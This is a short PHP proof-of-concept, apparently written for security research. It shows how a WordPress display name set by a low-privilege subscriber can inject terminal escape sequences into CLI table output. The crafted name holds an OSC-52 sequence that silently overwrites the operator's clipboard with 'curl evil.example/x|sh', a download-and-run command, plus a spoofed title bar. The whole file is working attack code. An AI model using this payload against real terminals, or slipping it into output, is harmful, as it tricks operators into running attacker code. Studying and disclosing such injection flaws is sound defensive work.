<?php
require __DIR__ . '/vendor/autoload.php';
use cli\Table;

// A malicious WordPress "display_name" a low-privilege Subscriber can set on their own profile,
// or a comment author name field, containing:
//  1. an OSC-52 clipboard-write escape sequence (widely supported, often enabled by default in
//     modern terminals: iTerm2, Windows Terminal, Alacritty, kitty, etc.) that silently overwrites
//     the operator's clipboard with attacker-chosen text, and
//  2. a terminal title-bar spoof (OSC 0) for good measure.
$clipboard_payload = base64_encode('curl evil.example/x|sh' . "\n");
$malicious_name = "Bob\x1b]52;c;{$clipboard_payload}\x07\x1b]0;PWNED-TITLE\x07";

$table = new Table(
    ['ID', 'user_login', 'display_name'],
    [
        ['1', 'admin', 'Administrator'],
        ['7', 'sec_research_subscriber', $malicious_name],
    ]
);
$table->display();
